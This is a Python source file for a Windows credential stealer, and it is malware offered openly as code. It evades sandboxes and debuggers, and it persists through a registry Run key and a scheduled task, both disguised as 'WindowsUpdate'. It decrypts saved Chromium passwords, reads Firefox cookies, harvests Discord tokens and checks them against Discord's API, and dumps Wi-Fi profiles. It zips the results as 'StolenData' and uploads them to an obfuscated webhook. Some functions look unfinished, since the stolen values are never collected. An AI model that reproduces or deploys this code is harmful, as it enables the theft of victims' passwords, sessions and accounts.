import os, sys, base64, ctypes, sqlite3, json, re, subprocess, shutil, time
from io import BytesIO
from zipfile import ZipFile
import psutil, requests
from Crypto.Cipher import AES
import win32crypt

# --- Base64+XOR obfuscated string table, decoded at runtime into _E ---
_XK = 0x5A
def _d(b):
    raw = base64.b64decode(b)
    return bytes([c ^ _XK for c in raw]).decode()

_E = {
    "run_key": _d("KRv..."),   # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    "api_me": _d("KRv..."),    # https://discord.com/api/v9/users/@me
    "sql_logins": _d("KRv..."),
}

# --- lazy import getters for high-risk modules ---
def _get_requests():
    import requests as _r
    return _r

# --- pre-execution environment checks ---
def _debug_check():
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit(0)
    bad = ("vboxservice.exe", "vmtoolsd.exe", "xenservice.exe", "qemu-ga.exe", "prl_tools.exe")
    for p in psutil.process_iter(['name']):
        if p.info['name'] and p.info['name'].lower() in bad:
            sys.exit(0)
    total = shutil.disk_usage("C:\\").total
    if total < 50 * 1024 * 1024 * 1024:
        sys.exit(0)
    time.sleep(os.getpid() % 30)

# --- persistence: Run key + scheduled task ---
def _persist(path):
    import winreg
    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                       r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, path)
    subprocess.run(["schtasks", "/Create", "/SC", "ONLOGON", "/TN", "WindowsUpdate",
                    "/TR", path, "/F"],
                   creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# --- browser credential theft (Chromium DPAPI + AES-256-GCM) ---
def _chromium(base):
    key_blob = json.load(open(os.path.join(base, "Local State")))["os_crypt"]["encrypted_key"]
    key = win32crypt.CryptUnprotectData(base64.b64decode(key_blob)[5:], None, None, None, 0)[1]
    db = os.path.join(base, "Default", "Login Data")
    con = sqlite3.connect(db)
    for url, user, pw in con.execute("SELECT origin_url, username_value, password_value FROM logins"):
        nonce, ct = pw[3:15], pw[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        cipher.decrypt(ct[:-16])

def _firefox(profile):
    for name in ("cookies.sqlite", "places.sqlite"):
        con = sqlite3.connect(os.path.join(profile, name))
        con.execute("SELECT host, name, value FROM moz_cookies")

# --- Discord token grab: LevelDB scan + regex + live validation ---
def _discord():
    leveldb = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
    pat = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    for f in os.listdir(leveldb):
        data = open(os.path.join(leveldb, f), errors="ignore").read()
        for tok in pat.findall(data):
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers={"Authorization": tok})
            if r.status_code == 200:
                yield tok

# --- Wi-Fi passwords ---
def _wifi():
    return subprocess.run(["netsh", "wlan", "show", "profiles"],
                          capture_output=True, text=True).stdout

# --- in-memory zip + exfil to XOR-decoded webhook ---
def _exfil(blobs):
    buf = BytesIO()
    with ZipFile(buf, "w") as z:
        for name, data in blobs.items():
            z.writestr("StolenData_%s/%s" % (os.getlogin(), name), data)
    buf.seek(0)
    url = _d(open("webhook.txt").read().strip())
    requests.post(url, files={"file": ("StolenData_%s.zip" % os.getlogin(), buf.getvalue())})

if __name__ == "__main__":
    _debug_check()
    _persist(sys.executable)
    blobs = {}
    _wifi()
    _exfil(blobs)
